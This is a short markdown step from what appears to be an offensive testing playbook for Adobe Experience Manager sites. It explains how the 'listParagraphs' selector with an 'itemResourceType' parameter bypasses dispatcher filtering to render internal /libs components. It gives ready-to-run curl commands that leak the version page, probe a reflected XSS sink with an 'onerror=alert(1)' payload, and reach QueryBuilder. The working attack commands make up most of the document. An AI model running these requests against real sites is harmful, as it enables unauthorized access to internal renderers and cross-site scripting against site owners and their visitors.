# Batch 10 — Cheat code `listParagraphs`

## GOAL
Use `listParagraphs` to run **internal Adobe pages** and check a known XSS param.

## TIME
~1 hour

## YOU NEED
- `PAGE` from batch 01

---

## WHY (30 seconds)

`listParagraphs` is another selector on normal pages.  
It takes `itemResourceType=...` and can render **internal** Adobe code under `/libs` that the bouncer would block if you asked for `/libs` directly.  
So: public page + selector = back door into internal renderers (version page, query UI, XSS sinks).

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
PAGE="/content/YOUR/PAGE"
```

### 1) Version / about page through the side door

```bash
curl -sk -o /tmp/lp.html -w "%{http_code} bytes=%{size_download}\n" \
  "$T${PAGE}.listParagraphs.html?itemResourceType=/libs/granite/ui/components/shell/help/about/about.jsp&limit=1"
head -c 500 /tmp/lp.html; echo
```

### 2) Marker in `path=` (XSS check)

```bash
curl -sk -o /tmp/lp.html -w "%{http_code}\n" \
  "$T${PAGE}.listParagraphs.html?itemResourceType=/libs/cq/statistics/components/queries-by-result/html.jsp&limit=1&path=aemxssmarker"
grep -n 'aemxssmarker' /tmp/lp.html | head
```

If marker is raw HTML, try:

```bash
curl -sk -o /tmp/lp.html \
  "$T${PAGE}.listParagraphs.html?itemResourceType=/libs/cq/statistics/components/queries-by-result/html.jsp&limit=1&path=%3Cimg%20src=x%20onerror=alert(1)%3E"
grep -i onerror /tmp/lp.html | head
```

### 3) Point at QueryBuilder type (bonus)

```bash
curl -sk -o /tmp/lp.out -w "%{http_code} bytes=%{size_download}\n" \
  "$T${PAGE}.listParagraphs.html?itemResourceType=/bin/querybuilder.json&limit=1"
head -c 300 /tmp/lp.out; echo
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| Version text / useful HTML | Document → **11** |
| XSS works | PoC → **11** |
| Total fail | Skip 11 or try 11 only if 06 worked → else **12** |

---

## NEXT
→ [11-selector-chains.md](./11-selector-chains.md)
